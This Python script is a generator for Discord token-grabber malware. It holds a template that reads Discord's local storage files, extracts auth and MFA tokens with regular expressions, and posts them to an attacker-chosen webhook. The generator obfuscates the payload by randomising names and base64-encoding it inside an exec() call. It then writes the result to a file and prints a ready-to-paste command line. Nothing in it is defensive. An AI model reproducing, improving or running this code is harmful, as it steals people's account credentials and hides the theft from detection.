from colorama import *
import codecs
import string
import random
import json
import os

err = f"[{Fore.RED}-{Style.RESET_ALL}]"
out = f"[{Fore.GREEN}:{Style.RESET_ALL}]"
inp = f"[{Fore.MAGENTA}>{Style.RESET_ALL}]"
log = f"[{Fore.CYAN}={Style.RESET_ALL}]"
ynb = f"[{Fore.GREEN}y{Style.RESET_ALL}/{Fore.RED}n{Style.RESET_ALL}/{Fore.BLUE}b{Style.RESET_ALL}]"

BASECODE = '''import re as vareight
import requests as varnine
import os as varseven
import json as varthirten
varone = varseven.getenv('APPDATA')
vartwo = [varone + '\\Discord', varone + '\\discordcanary', varone + '\\discordptb']
varten = "webhook"
try:
	for varthree in vartwo:
		varthree += '\\Local Storage\\leveldb'
		for varfour in varseven.listdir(varthree):
			if not varfour.endswith('.log') and not varfour.endswith('.ldb'):
				continue
			varfive = open(varthree + '\\\\' + varfour,'r',errors='ignore').read()
			for varsix in vareight.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',varfive):
				varnine.post(varten, varthirten={"content" : varsix}, params = {'wait' : True})
			for varsix in vareight.findall(r'mfa\.[\w-]{84}',varfive):
				varnine.post(varten, json={"content" : varsix}, params = {'wait' : True})
except FileNotFoundError:
	pass
'''

def gen_name(): # For making random var names
	name = ''
	for i in range(random.randint(3,9)):
		name += random.choice(string.ascii_letters)
	return name
def generate_token_grabber():
    global code
    code = BASECODE.replace('varone',gen_name()).replace('vartwo',gen_name()).replace('varthree',gen_name()).replace('varfour',gen_name()).replace('varfive',gen_name()).replace('varsix',gen_name()).replace('varseven',gen_name()).replace('vareight',gen_name()).replace('varnine',gen_name()).replace('varten',gen_name()).replace('vareleven',gen_name()).replace('vartwelve',gen_name()).replace('varthirten',gen_name()).replace('webhook', webhook)
    code = codecs.encode(bytes(code,'utf-8'),'base64').decode('utf-8').replace('\n','')
    code = f"import codecs;exec(codecs.decode(b'{code}','base64').decode('utf-8'));"
    return code

os.system("title [Terrific's Tokenloger Gen]")
i = input(f" {inp} Output file {ynb} ")

if str(i).lower() == "b":
	os.system("title [Terrific's Tokenloger Gen - File and Log]")
	f = open('token loger/config.json', 'r')
	config = json.load(f)
	webhook = config.get('webhook')
	code = generate_token_grabber()
	if code != "":
		print(f' {log} Generating a compact Token Grabber...')
		print(f'\n {out} Generated Python Code')
		print(f" {out} -\n{code}")
		print(f' {out} -\n CMD / Powershell Command')
		print(f' {out} py -c "{code}"')
		try:
			f = open(f"token loger/output/tokenloger.py", "w")
			f.write(code)
			f.close()
			print(f" {log} Created File 'output/tokenloger.py'")
			input(); exit()
		except Exception as e:
			print(f" {err} {e}")
			input(); exit()
	print(f" {err} couldnt generate code")
	input()

elif str(i).lower() == "y":
	os.system("title [Terrific's Tokenloger Gen - File only]")
	f = open('token loger/config.json')
	config = json.load(f)
	webhook = config.get('webhook')
	code = generate_token_grabber()
	if code != "":
		try:
			f = open(f"token loger/output/tokenloger.py", "w")
			f.write(code)
			f.close()
			print(f" {log} Created File 'output/tokenloger.py'")
			input(); exit()
		except Exception as e:
			print(f" {err} {e}")
			input(); exit()
	print(f" {err} couldnt generate code")
	input()

elif str(i).lower() == "n":
	os.system("title [Terrific's Tokenloger Gen - Log only]")
	f = open('token loger/config.json')
	config = json.load(f)
	webhook = config.get('webhook')
	code = generate_token_grabber()
	if code != "":
		print(f' {log} Generating a compact Token Grabber...')
		print(f'\n {out} Generated Python Code')
		print(f" {out} -\n{code}")
		print(f' {out} -\n CMD / Powershell Command')
		print(f' {out} py -c "{code}"')
		input(); exit()
	print(f" {err} coulnt generate code")
	input()
